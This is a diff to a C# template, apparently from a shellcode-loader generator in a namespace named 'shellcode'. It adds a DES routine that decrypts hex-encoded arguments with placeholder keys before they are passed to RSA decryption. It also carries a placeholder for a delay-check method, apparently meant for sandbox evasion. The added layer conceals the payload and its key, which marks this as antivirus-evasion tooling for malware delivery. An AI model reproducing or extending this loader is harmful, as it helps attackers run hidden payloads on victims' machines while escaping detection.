@@ -1,4 +1,5 @@
 using System;
+using System.IO;
 using System.Collections;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
@@ -10,6 +11,25 @@ namespace shellcode
 {
     class Program
     {
+	    public static string Decrypt(string Text, string key, string iv)
+        {
+            DESCryptoServiceProvider descryptoServiceProvider = new DESCryptoServiceProvider();
+            int num = Text.Length / 2;
+            byte[] array = new byte[num];
+            for (int i = 0; i < num; i++)
+            {
+                int num2 = Convert.ToInt32(Text.Substring(i * 2, 2), 16);
+                array[i] = (byte)num2;
+            }
+            descryptoServiceProvider.Key = Encoding.ASCII.GetBytes(key);
+            descryptoServiceProvider.IV = Encoding.ASCII.GetBytes(iv);
+            MemoryStream memoryStream = new MemoryStream();
+            CryptoStream cryptoStream = new CryptoStream(memoryStream, descryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Write);
+            cryptoStream.Write(array, 0, array.Length);
+            cryptoStream.FlushFinalBlock();
+            return Encoding.Default.GetString(memoryStream.ToArray());
+        }
+		
 {{CheckDelayMethod_Here}}
 
         static string execute_process(string file, string args = "")
@@ -50,8 +70,8 @@ namespace shellcode
 
             if (args.Length == 2)
             {
-                string privateKey = args[0];
-                string encryptData = args[1];
+                string privateKey = Decrypt(args[0], "{{Decrypt_Key_Here}}", "{{Decrypt_IV_Here}}");
+                string encryptData = Decrypt(args[1], "{{Decrypt_Key_Here}}", "{{Decrypt_IV_Here}}");
 				
 				RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
 				rsa.FromXmlString(privateKey);
